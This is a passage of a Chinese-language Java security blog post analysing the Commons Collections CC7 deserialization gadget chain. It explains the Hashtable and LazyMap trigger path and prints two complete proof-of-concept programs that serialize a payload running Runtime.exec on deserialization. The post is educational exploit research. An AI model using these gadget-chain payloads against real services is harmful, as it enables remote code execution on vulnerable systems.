+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/40ba40f0/cc7-8.png" title="hash相同的元素"></p>
+<p>再解决本地触发的问题，由于在第二次<code>put</code>中会进入到循环体中执行<code>e.key.equals(key)</code>方法，会调用到<code>transformerChain.transform()</code>达到执行代码。</p>
+<p>规避这个问题还是用老方法，先传入空的转换器进<code>Lazymap</code>对象中，<code>put</code>完值后再通过反射修改转换器。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//修改触发的转换器</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap2,transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>put</code>第二次的时候<code>e.key.equals(key)</code>中的<code>e.key</code>为第一次元素的<code>Key</code>，目的是拿第二次<code>put</code>的<code>key</code>查看是否跟表中的<code>key</code>是否相等，而参数中的<code>key</code>(第二次put入的key值)为最后调用的<code>m.get()</code>中的<code>m</code>对象，因此只需要修改第二个传入的<code>lazymap</code>对象的<code>factory</code>即可。</p>
+<p><img src="/posts/40ba40f0/cc7-11.png" title="触发点对象"></p>
+<p>还有个点就是由于在<code>put</code>入第二个<code>entry</code>元素时，调用了<code>e.key.equals(key)</code>方法，最后调用到<code>m.get(key)</code>即<code>Lazymap.get(key)</code>方法</p>
+<p><img src="/posts/40ba40f0/cc7-9.png" title="Lazymap.get(key)"></p>
+<p>由于转换器制空后，本地不会触发代码执行，但会进行<code>map.put(key, value);</code>，将第二个元素的<code>key</code>进行<code>put</code>操作，此时<code>Lazymap2</code>又新增了一个<code>key</code>为<code>yy</code>的元素，因此需要删除</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/40ba40f0/cc7-10.png" title="新增的yy"></p>
+<p>最后将<code>hashtable</code>对象进行序列化，反序列化的时候触发漏洞，得到完整poc：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map Lmap2= LazyMap.decorate(map2,transformerChainfake);</span><br><span class="line">        Lmap.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Lmap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">        ht.put(Lmap2,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//修改触发的转换器</span></span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap2,transformerChain);</span><br><span class="line">        Lmap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CC7-POC延伸"><a href="#CC7-POC延伸" class="headerlink" title="CC7-POC延伸"></a>CC7-POC延伸</h2><p>反序列化（readObject）过程</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//读取默认属性</span></span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取原始table长度和元素成员数量</span></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//重新计算table的长度</span></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        <span class="comment">//创建计算好长度的table表</span></span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取流中所有元素的key和value</span></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">//同步将key和value通过reconstitutionPut方法写入到新创建的table表中</span></span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在上面反序列化过程<code>reconstitutionPut</code>方法写入<code>entry</code>中发现一个敏感的<font color="red">key.hashCode()</font>，在cc6的学习中就是利用<code>hashmap.put(key,value)</code>调用<code>hash(key)</code>方法最后调用<code>key.hashcode()</code>进行调用达到代码执行。<br>同样在这里，key值可控，也是通过<code>hashtable</code>对象<code>put</code>入的<code>key</code>值进行<code>hashCode()</code>操作，跟cc6基本没差别，这就不再复分析一遍了。<br>得到一个延伸的poc<br>触发点不变</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>lazymap</code>调用触发点</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>再通过<code>TiedMapEntry</code>类最后调用<code>Lazymap.get()</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后使用<code>hashtable</code>的<code>put</code>方法添加元素<code>TiedMapEntry</code>对象作为入口,通过反射修改<code>table</code>表<code>key</code>值去规避本地执行，同样可以通过反射修改链转换器，操作跟cc6分析写Poc的一样，这里就用反射修改<code>key</code>值了。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure>
+
+<p>然后序列化，反序列化触发漏洞，得到完整POC:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行效果：<br><img src="/posts/40ba40f0/cc7-1.png" title="执行效果"></p>
+<h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC7相对于前面几个链，更换了入口，其中多层的equals方法调用，以及中间设置值绕了好一会，细节还是比较多，但理清过后还是比较容易理解，学习中间发现还有另外的延伸，能举一反三才是真正的进步。</p>
+<h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a><br>java漫谈</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/9758c0a8.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-12-26 14:44:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        #Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/" title="java利用链">
+                        #java利用链
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81Apache-Commons-Collections%E6%8F%8F%E8%BF%B0"><span class="toc-text">0x01、Apache Commons Collections描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">0x02、环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-text">0x03、分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E9%A1%BE"><span class="toc-text">回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashtable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-text">hashtable反序列化过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reconstitutionPut"><span class="toc-text">reconstitutionPut()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractMapDecorator-equals"><span class="toc-text">AbstractMapDecorator.equals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractMap-equals"><span class="toc-text">AbstractMap.equals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0"><span class="toc-text">POC构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7-POC%E5%BB%B6%E4%BC%B8"><span class="toc-text">CC7-POC延伸</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">0x04、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x05、参考链接</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
+        appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
+        placeholder: 'here',
+        avatar: 'monsterid',
+        lang: 'zh-CN'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Okaytc">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">Copyright © Okaytc 2022</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">一个热爱健身的脚本小子</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
